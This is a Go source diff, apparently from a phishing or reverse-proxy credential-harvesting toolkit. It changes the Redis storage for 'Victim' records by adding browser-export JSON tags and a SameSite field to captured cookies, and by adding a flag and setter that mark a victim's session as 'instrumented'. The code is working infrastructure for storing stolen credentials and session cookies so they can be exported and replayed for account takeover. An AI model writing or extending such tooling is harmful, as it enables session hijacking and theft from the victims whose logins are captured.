@@ -22,6 +22,8 @@ type Victim struct {
 
 	CredsCount int    `redis:"creds_count"`
 	CookieJar  string `redis:"cookiejar_id"`
+
+	SessionInstrumented bool `redis:"session_instrumented"`
 }
 
 // a victim has at least one set of credentials
@@ -37,14 +39,16 @@ type VictimCredential struct {
 // KEY scheme:
 // victim:<ID>:cookiejar:<COOKIE_NAME>
 type VictimCookie struct {
-	Name     string `redis:"name"`
-	Value    string `redis:"value"`
-	Domain   string `redis:"domain"`
-	Expires  string `redis:"expires"`
-	Path     string `redis:"path"`
-	HTTPOnly bool   `redis:"httpOnly"`
-	Secure   bool   `redis:"secure"`
-	Session  bool   `redis:"session"` // is the cookie a session cookie?
+	Name     string `redis:"name" json:"name"`
+	Value    string `redis:"value" json:"value"`
+	Domain   string `redis:"domain" json:"domain"`
+	Expires  string `redis:"expires" json:"expirationDate"`
+	Path     string `redis:"path" json:"path"`
+	HTTPOnly bool   `redis:"httpOnly" json:"httpOnly"`
+	Secure   bool   `redis:"secure" json:"secure"`
+	SameSite string `redis:"sameSite" json:"sameSite"`
+	Session  bool   `redis:"session" json:"session"` // is the cookie a session cookie?
+
 }
 
 func StoreVictim(id string, victim *Victim) error {
@@ -62,6 +66,21 @@ func StoreVictim(id string, victim *Victim) error {
 	// push the victimId
 	_, err := rc.Do("RPUSH", "victims", id)
 	if err != nil {
+		return err
+	}
+
+	return nil
+}
+
+func SetSessionAsInstrumented(id string) error {
+
+	rc := RedisPool.Get()
+	defer rc.Close()
+
+	key := fmt.Sprintf("victim:%s", id)
+
+	if _, err := rc.Do("HSET", key, "session_instrumented", true); err != nil {
+		log.Error("error doing redis HSET: %s. session_instrumented field not saved.", err)
 		return err
 	}
 
@@ -197,7 +216,7 @@ func GetVictimCookiejar(id string) ([]VictimCookie, error) {
 		return nil, err
 	}
 
-	log.Info("Victim %s has %d cookies in the cookiejar", id, len(values))
+	log.Debug("Victim %s has %d cookies in the cookiejar", id, len(values))
 
 	var cookiejar []VictimCookie
 	for _, name := range values {
